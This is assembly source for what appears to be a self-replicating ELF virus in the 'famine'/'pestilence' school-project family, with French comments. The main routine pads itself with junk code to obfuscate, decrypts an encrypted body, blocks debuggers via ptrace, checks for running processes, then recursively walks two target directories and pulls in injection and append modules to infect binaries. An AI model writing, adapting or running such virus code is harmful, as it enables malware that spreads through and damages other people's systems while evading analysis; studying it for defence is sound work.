%include "include.s"

 ;   lea r15, [rel jump]
 ;   cmp byte [r15], 0xC3                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main

main:
    enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
    push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
    push rcx
    push rdi
    push rsi
useless1:   ; start of useless 1
    lea rdi, [rel pestilence]
    mov rax, 14
useless1_loop:
    dec rax
    cmp rax, 0
    jnz useless1_loop
    mov rax, 5
    mov rdi, -5
    mov rsi, 0
    syscall
    jmp decrypte
    lea rdi, [rel decrypt_v2 + PATH_BUFF_SIZE]
    mov rsi, DECRYPT_KEY_OFFSET
    lea rdx, [rel decrypt_v2 + WAIT_FORK_OPTION]
    mov rcx, SIGNATURE_SIZE
    mov rcx, rsi
    dec rcx
    mov r8, rdx
            ; end of useless 1
decrypte:
    jmp encrypted_start
    db "hahaahhhahhah"
    lea rdi, [rel decrypt_v2 + DECRYPT_FUNC_SIZE]
    mov rsi, ENCRYPT_SIZE
    lea rdx, [rel decrypt_v2 + DECRYPT_KEY_OFFSET]
    mov rcx, KEY_SIZE
    mov rbx, rsi
    dec rbx
    mov r8, rdx
useless2_1: 
    ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
    cmp rbx, 0
    mov rdx, [rel decrypt_v2]
    mov rdx, [rdi + rbx - 1]
    xor byte [rdi + rbx], dl
    jmp useless2_2             
    mov rax, rdi            ; long tmp = nb
    mov rbx, 21             ; int idx = 21;
    cmp rdi, 0              ; if (nb < 0)
    jz putnbr_print_zero
    jns putnbr_loop                ;   nb = abs(nb)
    neg rax
useless2_2: 
    ; data[i] = data[i] ^ key[i % key_size];
    xor rdx, rdx
    mov rax, rbx
    div rcx
    mov dl, [r8 + rdx]
    xor [rdi + rbx], dl
    jmp useless2_3
    putnbr_loop:
    cmp rax, 0              ; while (nb)
    jz endputnbr_loop              ;
    xor rdx, rdx            ;
    mov rcx, 10             ; nb = nb / 10
    div rcx                 ;
    add dl, '0'             ; c = nb % 10 + '0'
    dec rbx                 ; idx = idx - 1
    mov [rsp + rbx], dl     ; buff[idx] = c
    jmp putnbr_loop                ;
    putnbr_exit:
useless2_3: 
    ; data[i] = data[i] ^ value[i % 16]
    mov rax, rbx
    and rax, 15
    lea rdx, [rel decrypt_v2]
    mov al,  [rdx + rax]
    xor byte [rdi + rbx], al
    jmp useless2_4
    putnbr_print_zero:
    endputnbr_loop:
    cmp rdi, 0              ; if (nb < 0)
    jns putnbr_exit                ; idx = idx - 1
    dec rbx                 ; buff[idx] = '-'
    mov byte [rsp + rbx], '-'
useless2_4: 
    ; data[i] = (data[i] + i) % 256
    mov al, byte [rdi + rbx]
    sub al, bl
    mov byte [rdi + rbx], al
    jmp useless2_5
    mov rax, SYS_WRITE
    mov rdi, 1
    mov rsi, rsp
    add rsi, rbx
    mov rdx, 21
    sub rdx, rbx
    syscall                 ; write(1, buff, 21 - buff)
    leave
    ret
useless2_5: 
    dec rbx
    cmp rbx, 0
encrypted_start:
    xor rdi, rdi ;  PTRACE_TRACEME
    xor rsi, rsi
    mov rdx, 1
    xor r10, r10
    mov rax, SYS_PTRACE
    syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
    cmp rax, 0
    jl exit

    mov rax, SYS_GETPID
    syscall
    mov [rsp + ppid], rax

    call get_processus_actif
    cmp rax, 0
    jnz exit

birth_of_child:

useless_v3:
    mov rax, SYS_OPEN
    lea rdi, [rel bin]
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rax, 5 
    mov rdi, rax
    lea rsi, [rsp + fileTypeData]
    syscall

    mov rax, SYS_FORK
    mov rax, SYS_GETPID

uselessv4:

	mov		rbx, rsi
	mov		rdx, 14
	cmp	    rdx, 0				; if (begin_list == NULL)
	je		uselessv4				;	return ;
    xor     r8, 0
	cmp		r8, 0				; if (*begin_list == NULL)
	je		exit				;	return ;


    lea rdi, [rsp + fileName]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive

uselessv5:
	mov		rdi, 122	; a = (*begin_list)->data
	mov		rsi, -2891	; b = ((*begin_list)->next)->data
	push	rbx
	pop		rbx					; {
    lea rdi, [rel pestilence]
    lea rsi, [rel pestilence]
	call ft_strlen
	mov rcx, rax
	inc rcx
	repz cmpsb
	movzx rax, byte [rdi - 1]	; long ret = (long)*s1
	movzx rbx, BYTE [rsi - 1]	; long tmp = (long)*s2
	sub	rax, rbx				; ret -= tmp

    lea rdi, [rsp + fileName]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    jmp exit

exit:
    mov rax, SYS_GETPID
    mov rbx, [rsp + ppid]
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

    xor rax, rax
    
jump:
    ret
    nop
    nop
    nop
    nop

death_of_child:
    ret

%include "get_processus_actif.s"

;%include "putnbr.s"

%include "recursive.s"

%include "injection.s"

%include "append.s"

%include "decrypt.s"

%include "data.s"
